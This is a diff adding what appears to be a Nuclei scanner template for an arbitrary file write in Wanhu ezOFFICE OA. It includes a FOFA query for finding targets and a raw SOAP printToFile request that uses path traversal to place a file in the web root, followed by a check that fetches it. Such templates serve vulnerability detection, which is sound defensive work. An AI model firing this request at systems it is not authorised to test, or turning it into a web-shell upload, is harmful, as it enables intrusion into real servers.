@@ -1,0 +1,47 @@
+id: wanhu-freemarkerqa-fileupload
+
+info:
+  name: Wanhu OA - freemarkerQa - File Upload
+  author: qwtd
+  severity: critical
+  description: |
+    万户OA /defaultroot/./services/freemarkerQa 接口存在任意文件写入漏洞
+  reference:
+    - https://forum.butian.net/share/3784
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: body="/defaultroot/images"
+  tags: 万户网络-ezOFFICE
+
+http:
+  - raw:
+      - |
+        POST /defaultroot/./services/freemarkerQa HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
+        SOAPAction: 
+        Content-Type: text/xml;charset=UTF-8
+        Content-Length: 606
+
+        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:util="http://util.ezform.ezoffice.whir.com">
+          <soapenv:Body>
+            <util:printToFile soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+              <fileName xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">../server/oa/deploy/defaultroot.war/{{randstr_1}}.txt</fileName>
+              <content xsi:type="soapenc:string">{{randstr_2}}</content>
+            </util:printToFile>
+          </soapenv:Body>
+        </soapenv:Envelope>
+
+      - |
+        GET /defaultroot/{{randstr_1}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1==200 && status_code_2==200"
+          - "contains(body_2, '{{randstr_2}}')"
+        condition: and
